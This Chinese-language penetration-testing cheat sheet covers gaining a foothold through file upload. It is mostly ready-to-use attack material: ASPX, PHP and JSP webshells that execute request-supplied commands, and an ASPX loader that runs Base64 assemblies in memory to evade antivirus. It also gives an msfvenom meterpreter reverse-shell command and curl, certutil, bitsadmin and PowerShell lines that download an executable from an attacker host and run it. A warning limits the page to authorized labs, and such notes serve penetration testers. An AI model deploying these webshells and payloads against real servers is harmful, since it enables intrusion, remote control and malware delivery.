# Web 入口

::: warning 仅供学习 / 授权实验
下面的最小执行页用于证明「上传被当成脚本跑」。授权测试证明 RCE 即可，不要把完整马框架提交到 GitHub。
:::

```text
whoami
whoami /priv
```

有 `SeImpersonatePrivilege` → [Windows 提权](/topics/windows-privesc)。

## 最小 ASPX（IIS）

```html
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e) {
    string c = Request["cmd"];
    if (String.IsNullOrEmpty(c)) { Response.Write("ready"); return; }
    ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + c);
    psi.RedirectStandardOutput = true;
    psi.RedirectStandardError = true;
    psi.UseShellExecute = false;
    psi.CreateNoWindow = true;
    using (Process p = Process.Start(psi)) {
        Response.ContentType = "text/plain";
        Response.Write(p.StandardOutput.ReadToEnd());
        Response.Write(p.StandardError.ReadToEnd());
    }
}
</script>
```

```text
GET /upload/x.aspx?cmd=whoami%20/priv
```

公开 webshell 特征会被杀：去掉 UI、去掉 `eval`。EXE 落地被杀时，改内存加载：

```html
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Reflection" %>
<script runat="server">
void Page_Load(object s, EventArgs e) {
    byte[] raw = Convert.FromBase64String(Request["b64"]);
    Assembly a = Assembly.Load(raw);
    a.GetType("Runner").GetMethod("Run").Invoke(null, null);
}
</script>
```

`b64` 是上面 C# runner 程序集的 Base64，不要传原生 EXE。

## PHP / JSP 最小回显

```php
<?php
if (!isset($_REQUEST['cmd'])) { echo "ready"; exit; }
system($_REQUEST['cmd']);
```

```xml
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c == null) { out.print("ready"); return; }
Process p = Runtime.getRuntime().exec(c);
BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
String line; while ((line = r.readLine()) != null) out.println(line);
%>
```

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LHOST LPORT=LPORT -f aspx
```

## 注入后下载

```text
curl -so C:\Windows\Temp\p.exe http://LHOST/p.exe
certutil -urlcache -split -f http://LHOST/p.exe C:\Windows\Temp\p.exe
bitsadmin /transfer j /download /priority normal http://LHOST/p.exe C:\Windows\Temp\p.exe
powershell -c "iwr http://LHOST/p.exe -o C:\Windows\Temp\p.exe"
```

短命令：

```text
curl -so a http://LHOST/a&a
```

哈希校验：`certutil -hashfile a MD5`
